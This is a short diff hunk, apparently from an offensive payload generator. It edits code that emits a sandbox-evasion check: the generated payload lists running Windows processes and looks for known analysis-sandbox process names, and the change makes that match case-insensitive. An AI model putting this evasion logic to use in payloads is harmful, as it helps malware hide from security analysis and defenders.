@@ -241,7 +241,7 @@ def senecas_games(evasion_payload):
             check_code += '\t' * num_tabs_required + '_, ' + current_processes + ' = win32pdh.EnumObjectItems(None,None,\'process\', win32pdh.PERF_DETAIL_WIZARD)\n'
             check_code += '\t' * num_tabs_required + 'for ' + process + ' in ' + current_processes + ':\n'
             check_code += '\t' * num_tabs_required + '\tfor ' + sandbox_proc + ' in ' + bad_procs + ':\n'
-            check_code += '\t' * num_tabs_required + '\t\tif ' + sandbox_proc + ' in str(' + process + '):\n'
+            check_code += '\t' * num_tabs_required + '\t\tif ' + sandbox_proc + ' in str(' + process + '.lower()):\n'
             check_code += '\t' * num_tabs_required + '\t\t\t' + sandbox_exist + '.append(' + process + ')\n'
             check_code += '\t' * num_tabs_required + '\t\t\tbreak\n'
             check_code += '\t' * num_tabs_required + 'if not ' + sandbox_exist + ':\n'
